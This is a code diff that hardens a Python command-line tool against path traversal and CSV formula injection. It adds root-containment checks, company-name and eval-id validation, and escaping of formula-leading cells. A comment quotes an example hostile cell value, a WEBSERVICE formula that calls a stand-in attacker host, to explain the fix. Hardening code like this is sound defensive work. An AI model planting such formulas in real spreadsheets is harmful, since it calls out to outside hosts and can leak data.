@@ -2248,11 +2248,33 @@ def _handle_ai_strategy_only(config: CLIConfig) -> int:
         )
         return 1
 
-    # Validate file exists
-    path = Path(report_path)
+    # Validate file exists and lives under a trusted root. Without root
+    # containment, an attacker who can pass --ai-strategy-only arguments
+    # (e.g. via shared automation) could upload arbitrary readable files
+    # as Deep Research context.
+    path = Path(report_path).expanduser()
     if not path.exists():
         console.error(f"Report file not found: {report_path}")
         return 1
+    try:
+        from primr.config.config import OUTPUT_DIR, WORKING_DIR
+
+        allowed_roots = [Path(OUTPUT_DIR).resolve(), Path(WORKING_DIR).resolve()]
+        if config.output_dir:
+            allowed_roots.append(Path(config.output_dir).resolve())
+        resolved_path = path.resolve()
+        if not any(
+            resolved_path == root or resolved_path.is_relative_to(root)
+            for root in allowed_roots
+        ):
+            console.error(
+                f"Report file is outside allowed roots (output/, working/): {resolved_path}"
+            )
+            return 1
+    except Exception:
+        # Defensive: if containment check itself fails, fall through to
+        # filename derivation but log it.
+        logger.warning("Could not enforce report-root containment for %s", path)
 
     # Get strategy type (default to 'ai' if not specified)
     strategy_type = getattr(config, "strategy_type", "ai")
@@ -2266,8 +2288,7 @@ def _handle_ai_strategy_only(config: CLIConfig) -> int:
     }
     strategy_display = strategy_names.get(strategy_type, strategy_type)
 
-    # Extract company name from filename or content
-    # Filename pattern: "Company Name_Strategic_Overview_MM-DD-YYYY.md"
+    # Extract company name from filename or content.
     company_name = config.company_name
     if not company_name:
         filename = path.stem
@@ -2281,6 +2302,19 @@ def _handle_ai_strategy_only(config: CLIConfig) -> int:
         else:
             # Fallback: use filename without extension
             company_name = filename.replace("_", " ")
+
+    # Always run company_name through the path-traversal-aware validator
+    # before it reaches output-path construction in _generate_strategy_section.
+    try:
+        from primr.utils.validators import (
+            InputValidationError,
+            validate_company_name,
+        )
+
+        company_name = validate_company_name(company_name)
+    except InputValidationError as e:
+        console.error(f"Invalid company name: {e.reason}")
+        return 1
 
     console.banner(f"{strategy_display} Generation")
     console.info(f"Company: {company_name}")
@@ -2643,7 +2677,15 @@ def _handle_eval(config: CLIConfig) -> int:
         return 1
 
     eval_root = Path(config.eval_root)
-    eval_dir = eval_root / config.eval_id
+    # _safe_eval_dir rejects traversal/separators in eval_id and confirms
+    # the resolved directory stays under eval_root before any mkdir/write.
+    try:
+        from primr.core.model_eval import _safe_eval_dir
+
+        eval_dir = _safe_eval_dir(eval_root, config.eval_id)
+    except ValueError as e:
+        console.error(f"Invalid --eval-id: {e}")
+        return 1
     eval_dir.mkdir(parents=True, exist_ok=True)
     manifest_path = Path(config.eval_manifest) if config.eval_manifest else None
     if config.eval_company and manifest_path is None:
@@ -4360,15 +4402,29 @@ def enrich_batch(
     if missing:
         console.warn(f"Missing websites: {missing} (edit the CSV to add them manually)")
 
-    # Save enriched CSV
+    # Save enriched CSV. Sanitize formula-leading cells before export so
+    # Excel/Sheets/LibreOffice won't evaluate hostile content (e.g. a
+    # company_name like `=WEBSERVICE("https://attacker/")` injected via
+    # the input spreadsheet). Prefixing with a single quote is the
+    # standard CSV-injection mitigation: spreadsheet apps render the
+    # value as a string instead of a formula. See OWASP "CSV Injection".
     import pandas as pd
+
+    _DANGEROUS_LEAD_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+    def _csv_safe(value: object) -> object:
+        if isinstance(value, str) and value and value[0] in _DANGEROUS_LEAD_CHARS:
+            return "'" + value
+        return value
+
+    safe_rows = [{k: _csv_safe(v) for k, v in row.items()} for row in enriched]
 
     base = _os.path.splitext(_os.path.basename(file_path))[0]
     suffix = f"_{industry.lower().replace(' ', '_')}" if industry else ""
     out_name = f"{base}{suffix}_enriched.csv"
     out_path = _os.path.join(".", out_name)
 
-    pd.DataFrame(enriched).to_csv(out_path, index=False, encoding="utf-8")
+    pd.DataFrame(safe_rows).to_csv(out_path, index=False, encoding="utf-8")
     console.blank()
     console.ok(f"Saved: {out_path}")
 
